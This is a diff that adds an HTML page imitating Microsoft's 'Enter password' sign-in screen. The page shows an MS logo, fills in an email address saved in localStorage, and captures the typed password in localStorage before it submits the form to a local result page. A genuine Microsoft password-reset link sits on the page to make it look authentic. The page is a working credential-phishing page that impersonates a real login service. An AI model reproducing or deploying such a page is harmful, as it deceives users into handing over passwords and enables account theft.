@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<style>
+body {
+  background-image: url("back.png");
+}
+p {
+font-family:helvetica;
+font-size:12px;
+}
+h1 {
+font-family:helvetica;
+font-size:22px;
+color:#252525;
+}
+</style>
+<html>
+<body onload="setData()">
+
+<script>
+function setData(){
+    if(typeof(localStorage) != "undefined"){
+        document.getElementById("show").innerHTML = localStorage.email;
+    }
+}
+</script>
+<script>
+function submitPass(){
+    if(typeof(localStorage) != "undefined"){
+        localStorage.passIn = document.getElementById("passIn").value;
+    }
+    document.getElementById("passForm").submit();
+}
+</script>
+
+
+<div style="margin-left:35%; padding:40px; margin-top:15%; height:240px; width:25%; background-color: #ffffff; border: 1px solid #868687;">
+<img src="MS-logo.png">
+
+
+<h1>Enter password</h1>
+
+<form id="passForm" action="result.html" >
+<input type="password" style="font-family:helvetica; font-size:15px; border: 1px solid #ffffff; border-bottom: 1px solid #E3E3E3; width: 98%;" type="text" placeholder="Password" id="passIn" name="passIn"><br><br>
+<input type="image" id=btn src ="signin.png" alt="Signin" style="float:right;" onclick="submitPass()">
+</form>
+
+<p><a style = "color:#2C6CEE; text-decoration:none;" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fusername%3dmintycow123%2540hotmail.com%26id%3d250206%26mkt%3den-GB%26username%3dmintycow123%2540hotmail.com%26id%3d250206%26contextid%3dBCCD85025596E115%26opid%3dB1C917F175FFAE0C%26bk%3d1670068180&id=250206&uiflavor=web&uaid=f6f00d9df6a048249082a6845bbff4e4&mkt=EN-GB&lc=2057&bk=1670068180">Forgotten your password? </a></p>
+<p><a style = "color:#2C6CEE; text-decoration:none;" href="MS-login.html">Sign in with another Microsoft account</a></p>
+</div>
+
+</body>
+</html>
